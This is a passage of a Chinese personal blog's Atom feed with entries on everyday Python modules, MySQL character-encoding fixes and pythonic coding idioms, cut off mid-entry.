      &lt;p&gt;最近因为设计网站的时候需要实现一个后台处理的功能，在寻找解决方式的时候了解到了php输出缓冲的功能，让我第一次意识到http具体的传输数据都是什么流程（不会告诉你们我以前一直以为http只有一次数据传输的！），又get到一个新技能点，先记录下来，以后了解的多了再进一步补充吧&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python模块使用记录</title>
    <link href="https://someonesometimes.github.io/2017/06/15/python%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://someonesometimes.github.io/2017/06/15/python模块使用记录/</id>
    <published>2017-06-15T03:41:11.000Z</published>
    <updated>2017-10-01T16:42:58.849Z</updated>
    
    <content type="html"><![CDATA[<p>目前使用到的模块有：</p><ul><li>json</li><li>configparser</li><li>文件读写</li><li>os</li><li>sys</li><li>re</li><li>BeautifulSoup</li><li>requests</li><li>collections</li></ul><a id="more"></a><h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"></div><div class="line">path = <span class="string">'F:/json.txt'</span></div><div class="line">_dict = &#123;<span class="string">'key1'</span>:<span class="string">'value1'</span>, <span class="string">'key2'</span>:<span class="string">'value2'</span>&#125;</div><div class="line"></div><div class="line"><span class="comment">#将python数据类型转化为json字符串并写入到txt文件中</span></div><div class="line">fw = open(path, <span class="string">'w'</span>)</div><div class="line">str = json.dumps(_dict) <span class="comment">#从python类型转化到json字符串的函数</span></div><div class="line">fw.write(str)</div><div class="line">fw.close()</div><div class="line"></div><div class="line"><span class="comment">#从txt文件中提取json字符串并转化为python数据类型</span></div><div class="line">fr = open(path, <span class="string">'r'</span>)</div><div class="line">str = fr.read()</div><div class="line">_dict = json.loads(str)         <span class="comment">#从json字符串转化到python字典类型的函数</span></div><div class="line">fr.close()</div><div class="line"></div><div class="line"><span class="comment">#一个可以将多个变量作为字典转成json格式的函数，使用python可变参数实现</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_encode</span><span class="params">(**kwargs)</span>:</span></div><div class="line"><span class="keyword">return</span> json.dumps(kwargs)</div><div class="line"></div><div class="line">str = json_encode(var1 = <span class="string">'Yiruma'</span>, var2 = &#123;<span class="string">'light'</span>:<span class="string">'music'</span>&#125;, var3 = [<span class="number">1</span>,<span class="string">'2'</span>])</div></pre></td></tr></table></figure><p><img src="http://i.imgur.com/JA2uF5O.png" alt=""></p><hr><h2 id="configparser"><a href="#configparser" class="headerlink" title="configparser"></a>configparser</h2><p>本来学了想用作python的配置文件存储，结果后来一想还是用json存吧，方便不同语言间操作，先记录下来以备后用<br>这是python3的操作方法，具体python2的操作还不太一样，python2<a href="https://docs.python.org/2/library/configparser.html?highlight=configparser#examples" target="_blank" rel="external">走这里</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> configparser</div><div class="line"></div><div class="line"><span class="comment">#configparser写配置：</span></div><div class="line">fw = open(<span class="string">'F:/crawler.ini'</span>, <span class="string">'w'</span>)</div><div class="line">config = configparser.ConfigParser()</div><div class="line">config[<span class="string">'key1'</span>] = &#123;<span class="string">"var1"</span>:<span class="string">'1'</span>, <span class="string">"var2"</span>:<span class="string">'2'</span>&#125;</div><div class="line">config[<span class="string">'key2'</span>] = &#123;<span class="string">"var3"</span>:<span class="string">'3'</span>, <span class="string">"var4"</span>:<span class="string">'4'</span>&#125;</div><div class="line">config.write(fw)</div><div class="line">fw.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#configparser读取配置</span></div><div class="line">config = configparser.ConfigParser()</div><div class="line">config.read(<span class="string">'F:/crawler.ini'</span>)</div><div class="line">config_var = config.sections()</div><div class="line"></div><div class="line"></div><div class="line">/**</div><div class="line">注释：Config parsers do <span class="keyword">not</span> guess datatypes of values <span class="keyword">in</span> configuration files, always storing them internally <span class="keyword">as</span> strings. This means that <span class="keyword">if</span> you need other datatypes, you should convert on your own:</div><div class="line">在存储的配置文件中，所有的数据都是以字符串形式存储的</div><div class="line">*/</div></pre></td></tr></table></figure></p><hr><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">f = open(file_path, mode)</div><div class="line"></div><div class="line">文件打开的模式有：</div><div class="line">r 只读方式打开，函数f.read()返回所有  f.readlines()返回列表</div><div class="line">w 只写方式打开，注意会覆盖原来的文件，函数f.write()写入数据</div><div class="line">a 追加方式打开，指针在文件的末尾，函数f.write()写入数据</div><div class="line"></div><div class="line">rb, wb, ab  都是以二进制格式来读写文件</div><div class="line"></div><div class="line">r+, w+, a+  都是打开文件用于读写</div></pre></td></tr></table></figure><hr><h2 id="os操作"><a href="#os操作" class="headerlink" title="os操作"></a>os操作</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line"></div><div class="line">#调用命令行</div><div class="line">os.system()</div><div class="line"></div><div class="line">#检查目录或文件是否存在，并返回bool值，python2中注意参数编码需为gbk</div><div class="line">os.path.exists(path)</div><div class="line"></div><div class="line">#列出目录下所有的文件名</div><div class="line">os.listdir(path)</div><div class="line"></div><div class="line">#判断是否是目录</div><div class="line">os.path.isdir()</div><div class="line"></div><div class="line">#判断是否是文件</div><div class="line">os.path.isfile()</div><div class="line"></div><div class="line">#创建文件夹</div><div class="line">os.makedir()</div><div class="line"></div><div class="line">#创建多级文件夹</div><div class="line">os.makedirs()</div><div class="line"></div><div class="line">#文件重命名</div><div class="line">os.rename(old, new)</div><div class="line"></div><div class="line">#文件删除</div><div class="line">os.remove()</div><div class="line"></div><div class="line">#获取当前工作目录</div><div class="line">os.getcwd()</div><div class="line"></div><div class="line">#分离文件名</div><div class="line">os.path.split(r"c:\python\hello.py") --&gt; ("c:\\python", "hello.py")</div><div class="line"></div><div class="line">#分离扩展名</div><div class="line">os.path.splitext(r"c:\python\hello.py") --&gt; ("c:\\python\\hello", ".py")</div></pre></td></tr></table></figure><hr><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">  <span class="comment">#首先为只有两个参数下的可能的两个场景（version，help）做出解释，之后退出</span></div><div class="line">  <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>].startswith(<span class="string">'--'</span>):</div><div class="line">    option = sys.argv[<span class="number">1</span>][<span class="number">2</span>:]</div><div class="line">    <span class="keyword">if</span> option == <span class="string">'version'</span>:</div><div class="line">      <span class="keyword">print</span> (<span class="string">'Version 1.0'</span>)</div><div class="line">    <span class="keyword">elif</span> option == <span class="string">'help'</span>:</div><div class="line">      <span class="keyword">print</span> (<span class="string">'usage python crawler.py blog_nick original_url page_reg article_reg title'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">print</span> (<span class="string">'Unknown option'</span>)</div><div class="line">    exit()</div><div class="line">  </div><div class="line">  <span class="comment">#再为参数个数非6的情况做出解释，告知正确的参数格式</span></div><div class="line">  <span class="keyword">elif</span> len(sys.argv) != <span class="number">6</span>:</div><div class="line">    <span class="keyword">print</span> (<span class="string">'usage python crawler.py blog_nick original_url page_reg article_reg title'</span>)</div><div class="line">    exit()</div><div class="line"></div><div class="line">  <span class="comment">#确定拥有正常个数的参数，接下来就是正常的操作了</span></div><div class="line">  ...</div><div class="line">  ...</div></pre></td></tr></table></figure><hr><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>更详细的操作方法见<a href="https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html" title="https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html" target="_blank" rel="external">https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="comment">#创建正则表达式，我一般习惯这样书写，可以方便重复使用，毕竟构造正则表达式是很耗费时间的</span></div><div class="line">reg = re.complie(<span class="string">'xxx'</span>)</div><div class="line"></div><div class="line"><span class="comment">#正则表达式的方法：</span></div><div class="line">reg.findall(str)   <span class="comment">#匹配所有匹配到的字符串，并返回一个列表</span></div><div class="line">reg.sub(new, str)  <span class="comment">#将str中所有匹配到的字符串都用new来替换</span></div><div class="line">reg.search(str)    <span class="comment">#用于搜索，如果没有搜索到时返回None，搜索到时返回Match对象</span></div><div class="line">Match对象：在reg.Match()  reg.search()中都可能返回此对象，包含多种可读属性与方法</div></pre></td></tr></table></figure></p><p><img src="http://i.imgur.com/UYQlCPe.png" alt=""><br><img src="http://i.imgur.com/rIcy9L1.png" alt=""><br><img src="http://i.imgur.com/Q4QiDFL.png" alt=""></p><hr><h2 id="bs4-beautifulsoup"><a href="#bs4-beautifulsoup" class="headerlink" title="bs4.beautifulsoup"></a>bs4.beautifulsoup</h2><p>最全的操作方法见<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" title="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="external">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html</a><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">#建立BeautifulSoup对象</div><div class="line">html = s.get('http://cauc.me')</div><div class="line">bs = BeautifulSoup(html, "html.parser")</div><div class="line"></div><div class="line">#BeautifulSoup对象提供的选择器</div><div class="line">bs.a  bs.body  bs.parent  bs.children   bs.next_sibling    bs.previous_sibling</div><div class="line">.findall(id=xxx) .findall(class=xxx)  .findall('a')</div><div class="line"></div><div class="line">#BeautifulSoup对象提供对标签的内容选择</div><div class="line">.name节点名字   .string节点内容   .attrs节点属性</div></pre></td></tr></table></figure></p><hr><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">s = requests.session()</div><div class="line"></div><div class="line">方法</div><div class="line"><span class="comment">#使用get方式提交</span></div><div class="line">s.get(url=<span class="string">""</span>)</div><div class="line"></div><div class="line"><span class="comment">#使用post方式提交</span></div><div class="line">s.post(url=<span class="string">""</span>,data=dict格式)</div><div class="line"></div><div class="line"><span class="comment">#headers参数介绍</span></div><div class="line">headers以字典方式提交</div><div class="line">s.post(url=<span class="string">""</span>,headers=dict格式)</div><div class="line">常用的头有：X-Forwarded-For, Cookie, User-Agent等等</div><div class="line"></div><div class="line"><span class="comment">#timeout参数介绍</span></div><div class="line">timeout参数用来指定请求超时的时间，经常在爬虫中用到</div><div class="line">s.post(url=<span class="string">""</span>, timeout=xx)</div><div class="line"></div><div class="line"></div><div class="line">返回值：</div><div class="line">retu = s.get(<span class="string">"http://cauc.me"</span>)</div><div class="line"></div><div class="line">retu.context       <span class="comment">#返回的html文件</span></div><div class="line">retu.headers       <span class="comment">#返回的headers中的信息，是一个字典</span></div><div class="line">retu.status_code   <span class="comment">#返回http的状态值</span></div><div class="line"><span class="comment">#其他的返回值可以自己去测试下，都很简单，上面三个是经常用的</span></div></pre></td></tr></table></figure><hr><h2 id="collections"><a href="#collections" class="headerlink" title="collections"></a>collections</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">collections是一个非常方便的python内建集合模块，提供了许多有用的集合类</div><div class="line"></div><div class="line"><span class="comment">#defaultdict</span></div><div class="line">使用dict类型时，如果引用的key不存在，就会抛出KeyError一场，如果希望key不存在时，返回一个默认值，</div><div class="line">就可以使用defaultdict,这在很多场景下会很有用，之前我就经常在统计类型个数的时候使用</div><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</div><div class="line">dd = defaultdict(<span class="number">0</span>)</div><div class="line">dd[<span class="string">'xie'</span>] += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="comment">#namedtuple</span></div><div class="line">有些时候需要创建一个包含数据类型的类，比如要创建二位坐标类，使用Point(<span class="number">1</span>,<span class="number">2</span>)就要使用(<span class="number">1</span>,<span class="number">2</span>)明白的多</div><div class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</div><div class="line">point = namedtuple(<span class="string">'point'</span>, [<span class="string">'x'</span>,<span class="string">'y'</span>])</div><div class="line">p = point(<span class="number">1</span>,<span class="number">2</span>)</div><div class="line">p.x</div><div class="line">p.y</div><div class="line"></div><div class="line"><span class="comment">#除此之外还有的数据类型有：</span></div><div class="line">双向列表deque来代替单向列表list</div><div class="line">根据Key顺序对dict排序的OrderedDict</div><div class="line">计数器Counter,但是我一般习惯使用defaultDict来取得同样的效果</div><div class="line">ChinaMap  将map串联起来</div><div class="line">UserDict</div><div class="line">UserList</div><div class="line">UserString</div></pre></td></tr></table></figure><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;目前使用到的模块有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;json&lt;/li&gt;
&lt;li&gt;configparser&lt;/li&gt;
&lt;li&gt;文件读写&lt;/li&gt;
&lt;li&gt;os&lt;/li&gt;
&lt;li&gt;sys&lt;/li&gt;
&lt;li&gt;re&lt;/li&gt;
&lt;li&gt;BeautifulSoup&lt;/li&gt;
&lt;li&gt;requests&lt;/li&gt;
&lt;li&gt;collections&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mysql数据库编码问题的原因与解决方法</title>
    <link href="https://someonesometimes.github.io/2017/05/31/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98%E7%9A%84%E5%8E%9F%E5%9B%A0%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>https://someonesometimes.github.io/2017/05/31/mysql数据库编码问题的原因与解决方法/</id>
    <published>2017-05-31T11:35:32.000Z</published>
    <updated>2017-06-26T04:25:16.747Z</updated>
    
    <content type="html"><![CDATA[<p>好像这里必须要写点什么才不会显示整篇文章<br><a id="more"></a><br>mysql为不同场景下配置了不同的编码方案，像数据的存储，数据库连接的当前编码，我们通过sql语句<code>show variables like &#39;%character%&#39;;</code>就可以看到如下显示：<img src="http://i.imgur.com/UthX236.png" alt="">详细解释了各种场景下编码的意义：</p><blockquote><p>a、其中client是客户端使用的字符集，相当于网页中的字符集设置如下 </p><p><metahttp-equiv="content-type"content="text html;="" charset="utf-8"">。<br>b、其中的connection是连接数据库的字符集设置类型，如果php没有指明连接数据库使用的字符集类型<br>就按照服务器端默认的字符集设置。<br>c、其中database是数据库服务器中某个库使用的字符集设定，如果建库时没有指明，将使用服务器安装<br>时指定的字符集设置。<br>d、results是数据库给客户端返回时使用的字符集设定，如果没有指明，使用服务器默认的字符集。<br>e、server是服务器安装时指定的默认字符集设定。<br>f、system是数据库系统使用的字符集设定。 </metahttp-equiv="content-type"content="text></p></blockquote><p>我们从PHP对数据库进行操作的一次过程中，涉及到多个场景，先是PHP自身编码方案决定了它构建并发出的那条sql语句是什么编码的，之后语句执行后拿到的数据又会是一种编码，就是数据库中存储数据的编码方案，之后再以发送给php，这些场景中数据的编码方案是不同的，而mysql会在不同场景切换中对数据进行编码转换话，如果执行过程中数据的编码转化与mysql上表的配置不同，就会出现编码的问题，而出现问题的原因一般有两条：</p><h3 id="数据库对数据存储的编码方案"><a href="#数据库对数据存储的编码方案" class="headerlink" title="数据库对数据存储的编码方案"></a>数据库对数据存储的编码方案</h3><p>这个问题的产生比较奇怪，从上面表的character_set_database 我们可以看到，默认的数据库对数据存储的编码方案采用的是<strong>latin1</strong>，这种编码方案收录的字符除ASCII收录的字符外，还包括西欧语言、希腊语、泰语、阿拉伯语、希伯来语对应的文字符号，<strong>但是没有中文！！！！</strong>所以遇到中文的编码方案会出现报错或是乱码。。。<br>解决的方式也很简单，我们在新建数据库时为其指定默认的编码方案，使用支持中文的gbk,utf8编码就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">create database test default character set gbk;</div><div class="line">create database test default character set utf8;</div></pre></td></tr></table></figure></p><p>之后进入到这个数据库再看编码方案，在character_set_database那一栏就会有对应的修改了</p><h3 id="sql语句的编码方案"><a href="#sql语句的编码方案" class="headerlink" title="sql语句的编码方案"></a>sql语句的编码方案</h3><p>也就所输入sql语句是怎样编码的，如果sql语句的编码与mysql中记录的理解方式也就是编码方案不同，那自然也会出现问题。<br>给出几个场景的例子，比如我在cmd中对mysql进行操作，cmd的默认编码是GBK<img src="http://i.imgur.com/i6JDGa7.png" alt=""><br>而mysql中会按照记录中的utf8进行操作，这时就是出现问题<br>再比如PHP所发出的sql语句具体采用什么编码方案，取决于PHP运行环境中的编码（如果你不进行手动的解码再编码到指定码的话），这时也有可能出现于mysql中默认编码方案不同的问题</p><p>解决方式同样很简单，我们进行数据库操作时候，无论是使用命令行，还是调用高级语言的接口，都先指定自己的sql语句是以什么形式编码的，即语句<code>set names 编码方案</code>。这样之后就会修改当前操作下mysql的编码方案，像这张图就是我执行<code>set names gbk</code>后的改变结果：<img src="http://i.imgur.com/XVYIRtx.png" alt=""></p><h3 id="正好今天在用python3链接数据库，把我的编码配置扔出来"><a href="#正好今天在用python3链接数据库，把我的编码配置扔出来" class="headerlink" title="正好今天在用python3链接数据库，把我的编码配置扔出来"></a>正好今天在用python3链接数据库，把我的编码配置扔出来</h3><ul><li>数据库编码还是在创建时改为utf8</li><li>链接时指定客户端编码<br><code>pymysql.connect(host=&#39;localhost&#39;, port=3306, user=&#39;root&#39;, passwd=&#39;root&#39;, db=&#39;blog&#39;, charset=&#39;utf8&#39;)</code></li><li>指定编码格式<br><code>cur.execute(&quot;set names utf8&quot;)</code></li></ul><p>然后就OK了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好像这里必须要写点什么才不会显示整篇文章&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>优化 pythonic</title>
    <link href="https://someonesometimes.github.io/2017/05/28/%E4%BC%98%E5%8C%96-pythonic/"/>
    <id>https://someonesometimes.github.io/2017/05/28/优化-pythonic/</id>
    <published>2017-05-28T05:12:11.000Z</published>
    <updated>2017-10-01T16:44:13.813Z</updated>
    
    <content type="html"><![CDATA[<p>使用python已经有很长一段时间了，在比赛中python语言的简洁易懂性给了我很大的帮助。当对一项技能使用的熟练度到达一定程度的时候，就该重新入门了。本文章将长期保持更新，收集记录各种python黑魔法，努力使自己的代码变得更加pythonic！<br><a id="more"></a></p><p><strong>变量交换</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a,b = b,a</div></pre></td></tr></table></figure></p><hr><p><strong>对可变字符串不建议再使用temp = “(“+str(i)+”,”+str(j)+”)”的写法，给两种替换：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">temp = <span class="string">"(&#123;x&#125;,&#123;y&#125;)"</span>.format(x=str(i), y=str(j))</div><div class="line">temp = <span class="string">"(%(x),%(y))"</span> % &#123;<span class="string">'x'</span>:str(i), <span class="string">'y'</span>:str(j)&#125;</div></pre></td></tr></table></figure></p><hr><p><strong>类似于C里面的三元操作符：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">X <span class="keyword">if</span> X&lt;Y <span class="keyword">else</span> Y</div></pre></td></tr></table></figure></p><hr><p><strong>直接生成的列表（不是那种定义后一直要修改的）</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fr = open(<span class="string">"F://xie.txt"</span>)</div><div class="line">list = [i <span class="keyword">for</span> i <span class="keyword">in</span> fr.readlines()]</div></pre></td></tr></table></figure></p><hr><p><strong>python装饰器</strong><br>作用就是为函数外加一层代码，可以用于日志记录，函数运行时间记录，对于不合适的函数进行代码补充等等场景<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">runTime</span><span class="params">(tag = True)</span>:</span></div><div class="line"><span class="keyword">if</span> tag == <span class="keyword">True</span>:</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_deco</span><span class="params">(func)</span>:</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">startTime = time.time()</div><div class="line">retu = func(*args, **kwargs)</div><div class="line">endTime = time.time()</div><div class="line"><span class="keyword">print</span> (<span class="string">"RunTime is &#123;time&#125;"</span>.format(time=endTime-startTime))</div><div class="line"><span class="keyword">return</span> retu</div><div class="line"><span class="keyword">return</span> wrapper</div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_deco</span><span class="params">(func)</span>:</span></div><div class="line"><span class="keyword">return</span> func</div><div class="line"><span class="keyword">return</span> _deco</div><div class="line"></div><div class="line"><span class="meta">@runTime(True)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">myFunc</span><span class="params">(path)</span>:</span></div><div class="line">fr = open(path)</div><div class="line">list = [i <span class="keyword">for</span> i <span class="keyword">in</span> fr.readlines]</div><div class="line"></div><div class="line">myFunc(<span class="string">"F://xie.txt"</span>)</div></pre></td></tr></table></figure></p><p><strong>@runTime(True)相当于：myFunc = runTime(True)(myFunc(path))</strong></p><p><strong>调用逻辑为：</strong></p><ol><li>runTime(True) 返回_deco 因此等价于 _deco函数</li><li>_deco(myFunc(path))返回wrapper 因此等价于 wrapper函数</li><li>所以myFunc 等价于 执行逻辑之后的wrapper(path)函数</li></ol><p><strong>装饰器书写需要把握的重点是：</strong></p><ul><li>装饰器的本质是函数转换，经过@之后的那个函数其实最后都是变为装饰代码后的wrapper函数</li><li>基本的函数转换方式就是在每层函数中定义个子函数，然后逻辑执行后return 子函数</li></ul><hr><p><strong>python函数中的可变参数：</strong><br>其实实现原理很简单，def xie(<em>args, **kwargs)中的</em>args就相当于一个list， **kwargs就相当于一个dict，只是python为方便使用做出了进一步定义<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def xie(farg, *args)</div><div class="line">xie(1, 'two', 3) ==&gt; xie(1, ['two',3])</div><div class="line"></div><div class="line">def xie(farg, **kwargs)</div><div class="line">xie(1, url='/xss', method='get') ==&gt; xie(1, &#123;"url":'/xss', 'method':'get'&#125;)</div><div class="line"></div><div class="line">def xie(arg1, arg2, arg3)</div><div class="line">args = [2, 3]</div><div class="line">xie(1, *args) ==&gt; xie(1, 2, 3)</div><div class="line"></div><div class="line">def xie(arg1, arg2, arg3)</div><div class="line">kwargs = &#123;'arg1':1, 'arg2':2, 'arg3':3&#125;</div><div class="line">xie(**kwargs) ==&gt; xie(1, 2, 3)</div></pre></td></tr></table></figure></p><hr><p><strong>迭代器中使用计数模式</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fr = open(<span class="string">"F://xie.txt"</span>, <span class="string">'r'</span>)</div><div class="line"><span class="keyword">for</span> index, i <span class="keyword">in</span> enumerate(fr.readlines(), <span class="number">1</span>):</div><div class="line"><span class="keyword">print</span> (<span class="string">"&#123;index&#125;:&#123;i&#125;"</span>.format(index=index, i=i))</div></pre></td></tr></table></figure></p><p>将迭代列表用enumerate对象封装，每次迭代值返回两个————index, data。<br>同时enumerate()的第二个参数用于指定index的起始值，默认为0</p><hr><p><strong>对于对象的迭代器遍历如果只是为了循环检测是否存在某种情况，可以这样写：</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[row[<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> row[<span class="number">2</span>]!=<span class="string">'Yes'</span> <span class="keyword">for</span> row <span class="keyword">in</span> rows]</div></pre></td></tr></table></figure></p><p>之后使用any()  all() 函数做检测<br>any([1,0,0])列表中存在1即返回真      all([1,1,1])列表中全为真则返回真<br>因此具体可以这样写<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">any([row[<span class="number">1</span>]==<span class="number">0</span> <span class="keyword">and</span> row[<span class="number">2</span>]!=<span class="string">'Yes'</span> <span class="keyword">for</span> row <span class="keyword">in</span> rows])</div></pre></td></tr></table></figure></p><hr><p><strong>之前对dict的操作认识太浅显，重新整理下dict操作</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">获取字典中的值，get()函数支持默认参数方法，在没有键值的时候使用默认参数</div><div class="line">dict.get(<span class="string">'xie'</span>, <span class="string">'fei'</span>)</div><div class="line"></div><div class="line">检测键是否存在,存在会返回对应的值，不存在会返回<span class="keyword">None</span></div><div class="line">dict.get(<span class="string">'xie'</span>)</div><div 